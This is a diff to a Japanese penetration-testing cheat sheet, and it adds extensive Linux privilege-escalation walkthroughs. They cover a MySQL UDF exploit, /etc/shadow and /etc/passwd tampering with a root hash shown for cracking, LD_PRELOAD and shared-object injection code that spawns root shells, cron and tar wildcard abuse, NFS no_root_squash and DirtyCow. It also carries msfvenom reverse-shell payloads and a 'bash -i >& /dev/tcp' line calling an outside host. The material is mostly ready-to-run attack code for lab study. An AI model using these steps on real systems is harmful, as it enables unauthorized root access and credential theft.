@@ -164,7 +164,7 @@ nmap -p 25 --script smtp-commands 10.10.10.10
 ```
 |  コマンド  |  動作  |
 | ---- | ---- |
-|  VERY  |  サーバに電子メールアドレスの確認を要求　 |
+|  VERY  |  サーバに電子メールアドレスの確認を要求  |
 |  EXPN  |  サーバにメーリングリストの資格を要求  |
 
 ## DNS(53)
@@ -1250,25 +1250,231 @@ export TERM=xterm-256color
 stty rows <num> columns <cols>
 ```
 
-### カーネルバージョンを確認して、カーネルエクスプロイトを用いて権限昇格
+### Service Exploits(MySQL)
+MySQLがrootとして実行されており、rootユーザーにパスワードが割り当てられていない時、以下のエクスプロイトを使用することでroot権限を取得することができる。  
+https://www.exploit-db.com/exploits/1518
+まずは、raptor_udf2.cエクスプロイトコードをコンパイルする。
 ```
-uname -a
+cd /tmp
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+空白のパスワードを使用してrootユーザーとしてMySQLサービスに接続する。
+```
+mysql -u root
+```
+MySQLのシェルで以下のコマンドを実行して、コンパイルされたエクスプロイトを使用してユーザ定義関数(UDF)「do_system」を作成する。
+```
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/tmp/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+```
+この関数を使用して/bin/bashを/tmp/rootbashにコピーして、SUID権限を設定する。
+```
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+```
+MySQLシェルを終了して下記のコマンドを入力する。
+```
+/tmp/rootbash -p
+```
+### Weak File Permissions - Readable /etc/shadow
+/etc/shadowファイルにはユーザーパスワードハッシュが記述されている。  
+通常はrootユーザーのみが読み取ることができるが、設定ミスなどにより一般ユーザーでも読み取り可能なことがある。  
+まずは、読み取り可能かファイルの権限を確認する。
+```
+ls -l /etc/shadow
+
+-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
+```
+読み取り可能である場合、ファイルの中身を閲覧してrootのハッシュをコピーしてテキストファイルに保存する.
+
+```
+cat /etc/shadow
+
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+daemon:*:17298:0:99999:7:::
+bin:*:17298:0:99999:7:::
+sys:*:17298:0:99999:7:::
+
+
+cat hash.txt
+
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+```
+得られたrootパスワードのハッシュをjohnでパスワードクラックする。
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-### sudoコマンド悪用して権限昇格
+### Weak File Permissions - Writable /etc/shadow
+設定ミスなどにより、/etc/shadowファイルが書き込み可能である場合、rootのパスワードハッシュを自身で作成したものに置き換えて権限昇格することが可能である。
+```
+ls -l /etc/shadow
+
+-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
+```
+```
+mkpasswd -m sha-512 <パスワードにしたい好きな文字列>
+
+$6$xmmQPckNVPWL/VVF$wMS2EIY2jmISe6X2mcuBWo9aWLRg9/TaDhOLK/ZjS1197OSL7LugJIf4JXIhLLDR8xd1kbnKWYITJglhMFwQs1
+```
+その後、/etc/shadowのパスワードハッシュを上記のハッシュに書き換えて、rootユーザーに切り替える。
+
+### Weak File Permissions - Writable /etc/passwd
+/etc/passwdファイルには、ユーザーアカウントに関する情報が含まれている。これは誰でも読み取り可能になっているが、書き込みは通常rootユーザのみとなる。  
+しかし設定ミスなどにより、/etc/passwdファイルが書き込み可能である場合、rootのパスワードハッシュを自身で作成したものに置き換えて権限昇格することが可能である。
+```
+ls -l /etc/passwd
+
+-rw-r--rw- 1 bbbbroot root 1025 Feb  8 00:58 /etc/passwd
+```
+```
+openssl passwd <パスワードにしたい好きな文字列>
+```
+/etc/passwdファイルを編集して、生成されたパスワードハッシュに置き換えてrootユーザーに切り替える。  
+
+または、rootユーザーの行をコピーして、ファイルの最後に追加して、新たなrootユーザーとパスワードを設定することも可能である。
+
+### Sudo - Shell Escape Sequences
+sudo権限で実行できるプログラムの一覧を表示する。
 ```
 sudo -l
 ```
+GTFOBins(https://gtfobins.github.io)にアクセスして、表示されたプログラムを利用することで権限昇格できるかを試みる。
 
-### cronジョブの確認
-#### crontab
+### Sudo - Environment Variables
+sudoはユーザーの環境から特定の環境変数を継承するように構成できる。  
+まずは、継承されている環境変数を確認する(env_keepオプションを探す)。
+```
+user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+```
+LD_PRELOADとLD_LIBRARY_PATHは、どちらもユーザーの環境から継承される。  
+LD_PRELOADは、プログラムの実行時に他のどのオブジェクトよりも先に共有オブジェクトをロードする。  
+LD_LIBRARY_PATHは、共有ライブラリが最初に検索されるディレクトリのリストを提供します。  
+
+下記のコードを使用して共有オブジェクトを作成する。
+```
+preload.c:
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+```
+gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
+```
+LD_PRELOAD環境変数を新しい共有オブジェクトのフルパスに設定しながら、sudo(sudo -lの実行時にリストされる)を介して実行が許可されているプログラムを実行します。
+```
+sudo LD_PRELOAD=/tmp/preload.so <sudo -lでリストされたプログラム>
+```
+これにより、rootシェルを取得できる。  
+これを利用できるパターンとして、GTFOBinsには記載されていないプログラムがsudo -lにリストしている場合である。  
+例えば、apache2の場合はGTFOBinsには記載されていない。  
+まずは、apache2プログラムファイルに対してlddコマンドを実行して、プログラムで使用されている共有ライブラリを確認する。
+```
+ldd /usr/sbin/apache2
+      linux-vdso.so.1 =>  (0x00007fff3c8e7000)
+      libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fd2f55c2000)
+      libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fd2f539e000)
+      libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fd2f5164000)
+      libpthread.so.0 => /lib/libpthread.so.0 (0x00007fd2f4f48000)
+      libc.so.6 => /lib/libc.so.6 (0x00007fd2f4bdc000)
+      libuuid.so.1 => /lib/libuuid.so.1 (0x00007fd2f49d7000)
+      librt.so.1 => /lib/librt.so.1 (0x00007fd2f47cf000)
+      libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fd2f4598000)
+      libdl.so.2 => /lib/libdl.so.2 (0x00007fd2f4393000)
+      libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fd2f416b000)
+      /lib64/ld-linux-x86-64.so.2 (0x00007fd2f5a7f000)
+```
+下記のコードを使用して、リストされているライブラリの1つ(ここではlibcrypt.so.1を選択)と同じ名前の共有オブジェクトを作成する。
+```
+library_path.c:
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+```
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/library_path.c
+```
+最後に、LD_LIBRARY_PATH環境変数を/tmp(コンパイルされた共有オブジェクトを出力する場所)に設定しながら、sudoを使用してapache2を実行する。
+```
+sudo LD_LIBRARY_PATH=/tmp apache2
+```
+これにより、GTFOBinsに記載がないプログラムでもsudo -lによってリストされていた場合にrootシェルを取得することができる。
+
+### Cron Jobs - File Permissions
+cronジョブはユーザーが特定の時間または間隔で実行するようにスケジュールできるプログラムである。  
+cronテーブルファイル(crontabs)は、cronジョブの構成が記載されており、システム全体のcrontabは/etc/crontabにある。
 ```
 cat /etc/crontab
 crontab -l
 ls -al /etc/cron* /etc/at*
 cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
 ```
-#### systemd timersの確認
+上記のコマンドにより、スケジュールされたrootで実行されているcronジョブが存在し、現在のユーザー権限で書き込み可能なファイルがある場合、reverse shellペイロードを書き込むことでrootシェルを取得できる。
+
+### Cron Jobs - PATH Environment Variable
+crontabのPATH変数が、下記のoverwrite.shのように明示されていない場合、PATH変数に示されているパスに同じ名前のreverse shellファイルなどを配置することで、rootシェルを取得できる。
+```
+user@debian:~/tools/sudo$ cat /etc/crontab
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+```
+例えば、上記の結果の場合は/home/userディレクトリにreverse shellペイロードを記述したoverwrite.shを配置することでrootシェルを取得できる。
+
+### Cron Jobs - Wildcards
+/etc/crontabを確認した結果、下記のスクリプトがスケジュールさていてた場合
+```
+user@debian:~$ cat /usr/local/bin/compress.sh
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+```
+tarコマンドが/home/userディレクトリのファイルをバックアップするために、ワイルドカード(*)を使用して実行されていることに着目する。  
+tarについてGTFOBinsを確認すると、tarにはチェックポイント機能の一部として他のコマンドを実行できるコマンドラインオプションがあることを分かる。  
+```
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+```
+上記のバイナリをターゲット端末に転送して、ファイル権限を実行可能にしておく。
+```
+chmod +x /home/user/shell.elf
+```
+そして、ワイルドカード(*)で指定されているディレクトリに「--checkpoint=1」「--checkpoint-action=exec=shell.elf」を作成する。  
+cronジョブのtarコマンドが実行されると、ワイルドカード(*)によりこれらのファイルが含まれる。これらのファイル名は有効なtarコマンドラインのオプションであるため、tarはファイル名をコマンドオプションとして認識して、ファイル名ではなくコマンドラインオプションとして扱ってしまう。  
+これにより、shell.elfが実行されてrootシェルを取得することができる。
+
+#### Cron Jobs - Systemd Timers
 /etc/systemd/system/配下にファイルを配置されているファイルをチェック(見たことがないファイルが置かれていないか)
 - .service(定期実行するファイルのパスなどを記述)
 - .timer(時間間隔の指定)
@@ -1279,31 +1485,20 @@ systemctl list-timers --all
 find / -name *timer -type f 2>>/dev/null
 ```
 
-##### (備考)systemd timerの有効化と起動
 ```
+# Systemd Timerの有効化
 sudo systemctl start datetest.service
+# Systemd Timerの起動
 sudo systemctl start datetest.timer
 ```
-
-### SUID
-SUIDはset user IDを表し、ユーザーはファイル所有者としてファイルを実行できる。  
-これを利用して、LinuxではSUIDビットが有効になってファイル所有者がrootになっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができる。
-まずはSUIDファイルを見つける。
+### SUID/SGID Executables - Known Exploits
+SUIDはset user IDを表し、ユーザーはファイル所有者としてファイルを実行できる。   
+これを利用して、LinuxではSUIDビットが有効になってファイル所有者がrootになっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができる。  
 下記のコマンドを実行するとSUIDアクセス許可を物全てのバイナリを列挙することができる。
 ```
 find / -perm -u=s -type f 2>/dev/null
 find / -perm -4000 -type f 2>/dev/null
-```
-```
-特に/bin/screen-4.5.0などバージョンのついているものに注意
-/bin/bash
-/bin/cp
-/bin/find
-/bin/nano
-/bin/vim
-/bin/nmap (ver 2.02-5.21)
-/bin/more
-/bin/less
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
 - /は、ファイルシステムの先頭（ルート）から開始し、すべてのディレクトリを検索
 - -permは、後続の権限の検索
@@ -1313,16 +1508,151 @@ find / -perm -4000 -type f 2>/dev/null
 - 2はプロセスの2番目のファイル記述子であるstderr（標準エラー）を示す
 - &gt;はリダイレクトを意味する
 - /dev/nullは、書き込まれたすべてのものを破棄する特別なファイルシステムオブジェクト
-
-列挙後、権限昇格に使えそうなものをGTFOで調べる  
-https://gtfobins.github.io/
-
-### chmod777に設定したfile/dirを検索
 ```
-find / -type f -perm 777
+-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
+-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
+-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
+-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
+-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
+-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
+-rwsr-sr-x 1 root root 926536 Feb  8 02:25 /tmp/rootbash
+-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
+-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
+```
+コマンドを実行した上記の結果より、exim-4.84-3を列挙できる。  
+このソフトウェアには既知のエクスプロイトが存在する(CVE-2016-1531)。  
+これらを利用してエクスプロイトすることで権限昇格できる可能性がある。
+
+### SUID/SGID Executables - Shared Object Injection
+SUID実行可能ファイル(今回はsuid-soという名前の実行可能ファイル)が共有オブジェクトインジェクションに対して脆弱な場合、権限昇格できる可能性がある。  
+ファイルに対して、straceを実行して"open|access|no such file"を検索する。
+
+```
+strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
+
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libdl.so.2", O_RDONLY)       = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libm.so.6", O_RDONLY)        = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib/libc.so.6", O_RDONLY)        = 3
+open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
+```
+実行可能ファイルはホームディレクトリ内の/home/user/.config/libcalc.so共有オブジェクトを読み込もうとしているが、見つかっていないことを確認する。  
+これを利用するために、libcalc.soファイルの.configディレクトリを作成する。  
+```
+mkdir /home/user/.config
+```
+下記のコードを利用して、suid-so実行可能ファイルが探してた場所にある共有オブジェクトにコードをコンパイルする。  
+コード内容としては単にbashシェルを生成するものである。
+```
+libcalc.c:
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+        setuid(0);
+        system("/bin/bash -p");
+}
+```
+```
+gcc -shared -fPIC -o /home/user/.config/libcalc.so /tmp/libcalc.c
+```
+suid-so実行可能ファイルを再度実行すると、rootシェルを取得できる。
+```
+/usr/local/bin/suid-so
 ```
 
-### Capability
+### SUID/SGID Executables - Environment Variables
+sudo・root権限で実行可能なスクリプト内(SUIDバイナリ)にserviceやcurl、gzip、psコマンドなどがフルパスなしで記述され実行されている場合、自分が用意したコマンド(/bin/shやreverse shellスクリプト)などを実行させるようにパスを書き換える。  
+今回、利用するバイナリは/usr/local/bin/suid-envとする。
+```
+strings /usr/local/bin/suid-env
+
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+system
+__libc_start_main
+GLIBC_2.2.5
+l$ L
+t$(L
+|$0H
+service apache2 start
+```
+今回の場合、apache2を起動するためのserviceコマンドが絶対パスでないため、読み込むバイナリを置き換えてやることができる。
+```
+# Get a shell
+echo $PATH
+cd /tmp
+echo /bin/sh > service
+chmod 777 service
+export PATH=/tmp:$PATH or PATH=/tmp:$PATH /usr/local/bin/suid-env
+```
+別のパターンとして、SUIDバイナリにgzipが使用されていた場合にreverse shellを取得する際について記載する。
+```
+# reverse shell
+echo $PATH
+cd /tmp
+
+# gzipの部分はインジェクションさせたいコマンド
+echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" > gzip
+chmod 777 gzip
+export PATH=/tmp:$PATH
+
+# root権限で動かせるスクリプトなどを実行(前提としてスクリプト内で上記のgzipなどが記述されている)
+./backup.sh
+whoami → root
+```
+
+### SUID/SGID Executables - Abusing Shell Features (#1)
+sudo・root権限で実行可能なスクリプト内(SUIDバイナリ)に絶対パスを使用してコマンドを実行していても、Bashのバージョン(<4.2-048)によって権限昇格できる可能性がある。  
+今回、利用するバイナリは/usr/local/bin/suid-env2とする。
+```
+strings /usr/local/bin/suid-env2
+
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+system
+__libc_start_main
+GLIBC_2.2.5
+l$ L
+t$(L
+|$0H
+/usr/sbin/service apache2 start
+```
+/bin/bashのバージョンを確認する。
+```
+/bin/bash --version
+GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+```
+次に新しいBashシェルを実行する「/usr/sbin/service」という名前のBash関数を作成して関数をエクスポートする。
+```
+function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service
+```
+最後にsuid-env2を実行して、rootシェルを取得する。
+
+### SUID/SGID Executables - Abusing Shell Features (#2)
+*Bashのバージョンが4.4以降では機能しない。
+Bashデバッグを有効にし、PS4変数を/bin/bashのSUIDバージョンを作成する埋め込みコマンドに設定して/usr/local/bin/suid-env2実行可能ファイルを実行する。
+```
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+```
+-pを指定して、/tmp/rootbash実行可能ファイルを実行して、rootシェルを取得する。
+### SUID/SGID Executables - Capability
 SUIDはset user IDを表し、ユーザーはファイル所有者としてファイルを実行できる。  
 これはファイルの所有者の権限でプログラム/ファイルを実行するための一時的なアクセス権をユーザーに与えるものとして定義されている。  
 Capabilityは通常ルートに割り当てられているアクションを細かく分割して実行する仕組み。  
@@ -1360,6 +1690,99 @@ perl:
 cat etc/shadow
 ```
 
+### Passwords & Keys - History Files
+ユーザーが誤ってパスワードプロンプトではなく、コマンドラインでパスワード入力した場合、パスワードは履歴ファイルに記録される可能性がある。  
+下記のコマンドを使用して、ユーザーのホームディレクトリにある全ての日表示の履歴ファイルの内容を表示する。
+```
+cat ~/.*history | less
+```
+上記の結果より、パスワードらしきものが見つかればそれを利用してrootユーザーに切り替える。
+
+### Passwords & Keys - Config Files
+構成ファイルなどに、プレーンテキストや可逆形式のパスワードが含まれていることがある。  
+例えばWebアプリケーションのソースコードにハードコーディングされている場合や、MySQL内に保存されている場合、メモなどが残されている場合がある。  
+それらを利用して権限昇格できる可能性がある。
+
+### Passwords & Keys - SSH Keys
+.sshディレクトリなどに正しい権限が付与されていない場合、rootユーザーの秘密鍵などを読み取れる可能性がある。  
+この秘密鍵を利用して、rootユーザーとしてログインする。
+```
+chmod 600 id_rsa
+ssh -i id_rsa root@10.10.10.1
+```
+
+### NFS
+NFSを介して作成されたファイルは、リモートユーザーのIDを継承する。  
+ユーザーがrootであり、rootスカッシングが有効になっている場合、IDは代わりに「nobody」ユーザーに設定される。
+```
+# NFSの設定ファイルを確認
+cat /etc/exports
+
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+/tmpの共有ではno_root_squashとなっていることを確認する。  
+次にkaliのrootユーザーで/tmp共有をマウントする。
+```
+mkdir /tmp/nfs
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
+```
+マウントされた共有に以下のペイロードを保存する。
+```
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+chmod +xs /tmp/nfs/shell.elf
+```
+最後に、ターゲットマシンでファイルを実行してrootシェルを取得する。
+```
+/tmp/shell.elf
+```
+
+### Kernel Exploit
+カーネルバージョンを確認して、カーネルエクスプロイトを用いて権限昇格
+```
+uname -a
+```
+カーネルエクスプロイトの検出  
+linux-exploit-suggester2:  
+https://github.com/jondonas/linux-exploit-suggester-2
+#### Dirtycow
+・40839.c(dirty.c)
+パスワードを自身で入力して、firefaltというアカウントを作成する
+```
+gcc -pthread dirty.c -o dirty -lcrypt
+chmod 755 dirty
+```
+```
+./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: pass
+
+Complete line:
+firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash
+...
+
+su firefart
+```
+
+・40616.c(cowroot.c)
+実行するだけでrootになれる
+```
+gcc cowroot.c -o cowroot -pthread
+```
+```
+* $ ./cowroot
+* root@box:/root/cow# id
+* uid=0(root) gid=1000(foo) groups=1000(foo)
+```
+・c0w
+https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54
+```
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w
+```
+```
+/usr/bin/passwd
+```
+
 #### ファイルの検索
 ```
 find / -name <ファイル名> -type f 2>>/dev/null
@@ -1392,32 +1815,6 @@ ps auxコマンドでは確認できない定期的にUID=0(root権限)で実行
 馴染みのないプロセスが動作している場合、そのプロセスが権限昇格の鍵になる場合もあるため、要チェック。  
 
 
-### その他テクニック
-#### Path Variable
-sudo・root権限で実行可能なスクリプト内(SUIDバイナリ)にcurlやgzipやpsコマンドなどがフルパスなしで記述され実行されている場合、自分が用意したコマンド(/bin/shやreverse shellスクリプト)などを実行させるようにパスを書き換える。  
-スクリプト実行時にroot権限でreverse shellが得られる。
-```
-# Get a shell
-echo$PATH
-cd /tmp
-echo /bin/sh > curl
-chmod 777
-export PATH=/tmp:$PATH
-/usr/bin/menu # SUIDバイナリ
-```
-```
-# reverse shell
-echo $PATH
-cd /tmp
-# gzipの部分はインジェクションさせたいコマンド
-echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" > gzip
-chmod 777 gzip
-export PATH=/tmp:$PATH
-# root権限で動かせるスクリプトなどを実行(前提としてスクリプト内で上記のgzipなどが記述されている)
-./backup.sh
-whoami → root
-```
-
 #### ユーザを指定してコマンドを実行
 ```
 www-data@bashed:/$ sudo -l
@@ -1430,58 +1827,6 @@ User www-data may run the following commands on bashed:
 www-data@bashed:/$ sudo -u scriptmanager /bin/bash
 scriptmanager@bashed:/$ whoami
 scriptmanager
-```
-
-### Kernel Exploit
-#### Dirtycow
-・40839.c(dirty.c)
-パスワードを自身で入力して、firefaltというアカウントを作成する
-```
-gcc -pthread dirty.c -o dirty -lcrypt
-chmod 755 dirty
-```
-```
-./dirty
-/etc/passwd successfully backed up to /tmp/passwd.bak
-Please enter the new password: pass
-
-Complete line:
-firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash
-
-mmap: b778e000
-madvise 0
-
-ptrace 0
-Done! Check /etc/passwd to see if the new user was created.
-You can log in with the username 'firefart' and the password 'pass'.
-
-
-DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
-Done! Check /etc/passwd to see if the new user was created.
-You can log in with the username 'firefart' and the password 'pass'.
-
-
-DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
-```
-
-・40616.c(cowroot.c)
-実行するだけでrootになれる
-```
-gcc cowroot.c -o cowroot -pthread
-```
-```
-* $ ./cowroot
-* DirtyCow root privilege escalation
-* Backing up /usr/bin/passwd.. to /tmp/bak
-* Size of binary: 57048
-* Racing, this may take a while..
-* /usr/bin/passwd is overwritten
-* Popping root shell.
-* Don't forget to restore /tmp/bak
-* thread stopped
-* thread stopped
-* root@box:/root/cow# id
-* uid=0(root) gid=1000(foo) groups=1000(foo)
 ```
 
 #### tools
@@ -1794,7 +2139,7 @@ sc qc daclsvc
 ```
 sc config daclsvc binpath= "\"C:\Windows\Temp\reverse.exe\""
 ```
-最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを獲得できる。
+最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを取得できる。
 ```
 net start daclsvc
 ```
@@ -1821,7 +2166,7 @@ accesschk.exeを使用して現在のユーザーグループがC:\Program Files
 accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
 ```
 reverse shellペイロードの名前をCommon.exeに変更したものC:\Program Files\Unquoted Path Service\ディレクトリに配置をする。  
-最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを獲得できる。
+最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを取得できる。
 ```
 net start <Service Name>
 ```
@@ -1872,7 +2217,7 @@ reverse shellペイロードが配置されているパスを指すようにImag
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\services\<Service Name> /v ImagePath /t REG_EXPAND_SZ /d C:\Windows\Temp\reverse.exe /f
 ```
-最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを獲得できる。
+最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを取得できる。
 ```
 net start <Service Name>
 ```
@@ -1890,7 +2235,7 @@ reverse shellペイロードをコピーしてBINARY_PATH_NAMEで示されたバ
 ```
 copy C:\PrivEsc\reverse.exe "C:\Program Files\<Service Name>\<Service(reverse shellペイロードの名前をサービスバイナリの名前に変更したもの)>.exe" /Y
 ```
-最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを獲得できる。
+最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを取得できる。
 ```
 net start <Service Name>
 ```
@@ -1921,7 +2266,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
 ```
-最後に、netcatでlistenしてからインストーラーを実行すると、SYSTEM権限のreverse shellを獲得できる。
+最後に、netcatでlistenしてからインストーラーを実行すると、SYSTEM権限のreverse shellを取得できる。
 ```
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
@@ -1990,7 +2335,7 @@ pth-winexe -U 'admin%<転んで区切られたLMハッシュとLTLMハッシュ�
 pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.12.15 cmd.exe
 ```
 ### Scheduled Tasks
-スケジュールされているスクリプトがSYSTEM権限で実行されており、ファイルに書き込み権限がある場合、reverse shellペイロードを実行するようにスクリプトを書き換えてやることでSYSTEM権限のシェルを獲得することができる。
+スケジュールされているスクリプトがSYSTEM権限で実行されており、ファイルに書き込み権限がある場合、reverse shellペイロードを実行するようにスクリプトを書き換えてやることでSYSTEM権限のシェルを取得することができる。
 ```
 # スケジュールの一覧を表示
   (これでは見つからないことが多いため、スケジュールされたタスクが実行されていることを示すスクリプトやログファイルを手動で見つける必要がある)
@@ -2006,24 +2351,24 @@ accesschk.exe /accepteula -quvw user C:\Users\user\Desktop\task.ps1
 # reverse shellペイロードを実行するスクリプトを追記
 echo C:\Windows\Temp\reverse.exe >> C:\Users\user\Desktop\task.ps1
 ```
-netcatでlistenしておき、スケジュールされたタスクが実行されるのを待ち、システム権限のシェルを獲得する。
+netcatでlistenしておき、スケジュールされたタスクが実行されるのを待ち、システム権限のシェルを取得する。
 
 ### Insecure GUI Apps
-RDP(リモートデスクトップ)などでアクセスした際に、管理者権限で実行できるソフトウェアがある場合、それらを介してcmd.exeを起動することでSYTEM権限のシェルを獲得する。  
+RDP(リモートデスクトップ)などでアクセスした際に、管理者権限で実行できるソフトウェアがある場合、それらを介してcmd.exeを起動することでSYTEM権限のシェルを取得する。  
 例えば、管理者権限で動作するペイントを仮定する。  
 ```
 # 管理者権限でmspain.exeが起動されていることを確認
 tasklist /V | findstr mspaint.exe
 ```
 ペイントの[ファイル]→[開く]を押下して、file://c:/windows/system32/cmd.exeを開く。  
-これにより、SYSTEM権限のシェルを獲得することができる。
+これにより、SYSTEM権限のシェルを取得することができる。
 
 ### Startup Apps
 accesschk.exeを使用してBUILTIN\UsersグループがStartUpデディレクトリにファイルを書き込むことができることを確認。
 ```
 accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 ```
-その後、StartUpディレクトリにreverse shellペイロードのショートカットなどを配置して、netcatでlistenしながら管理者権限でログインされることで、SYSTEM権限のシェルを獲得できる。
+その後、StartUpディレクトリにreverse shellペイロードのショートカットなどを配置して、netcatでlistenしながら管理者権限でログインされることで、SYSTEM権限のシェルを取得できる。
 ```
 # ショートカットを生成するvbsスクリプト
 Set oWS = WScript.CreateObject("WScript.Shell")
@@ -2042,7 +2387,7 @@ socatリダイレクタを設定して、kaliの135番ポートをWindowsの9999
 sudo socat tcp-listen:135,reuseaddr,fork tcp:<Target IP>:9999
 ```
